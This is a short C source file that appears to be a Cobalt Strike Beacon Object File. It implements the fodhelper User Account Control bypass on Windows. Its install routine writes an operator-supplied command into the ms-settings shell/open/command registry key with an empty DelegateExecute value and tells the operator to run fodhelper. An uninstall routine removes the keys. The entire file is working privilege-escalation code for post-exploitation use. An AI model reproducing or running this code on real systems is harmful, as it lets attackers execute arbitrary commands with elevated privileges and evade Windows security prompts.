#include <windows.h>
#include "beacon.h"

WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *str);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, const LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR);

// update for variable command
void install(char* argv, int len)
{
    datap parser;	
    BeaconDataParse(&parser, argv, len);
		
    // CHAR * option; // not of use here
    CHAR* cmd;	
    cmd = BeaconDataExtract(&parser, NULL);
    //cmd = BeaconDataInt(&parser);

    HKEY hKey;
    LONG lReturnValue = 0;

    // create new key
    lReturnValue = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    if (lReturnValue != ERROR_SUCCESS) {
	BeaconPrintf(CALLBACK_OUTPUT, "Error creating/opening key\n");
        return;
    }
    else {
        ADVAPI32$RegSetValueExA(hKey, NULL, 0, REG_SZ, (LPCBYTE)cmd, MSVCRT$strlen(cmd));
        ADVAPI32$RegSetValueExA(hKey, "DelegateExecute", 0, NULL, NULL, NULL);
        ADVAPI32$RegCloseKey(hKey);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Registry keys have been added, now execute fodhelper\n");
    return;
}

void uninstall(char* argv, int len)
{
    HKEY hKey;
    LONG lReturnValue = 0;

    // create new key
    lReturnValue = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (lReturnValue != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "error creating/opening key\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "opened key successfully\n");

    ADVAPI32$RegDeleteValueA(hKey, "DelegateExecute");
    ADVAPI32$RegDeleteValueA(hKey, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "fodhelper bypass uninstalled\n");
    return;
}
